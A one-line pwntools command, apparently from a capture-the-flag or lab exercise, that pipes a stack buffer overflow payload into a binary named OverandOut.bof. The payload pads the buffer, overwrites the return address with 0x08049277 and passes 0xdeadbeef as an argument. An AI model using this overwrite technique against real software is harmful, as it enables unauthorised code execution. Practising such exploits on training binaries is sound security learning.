# Python code : 
```
python -c "from pwn import *; print('A'*76 + p32(0x08049277) + 'B'*4 + p32(0xdeadbeef))" | ./OverandOut.bof
```
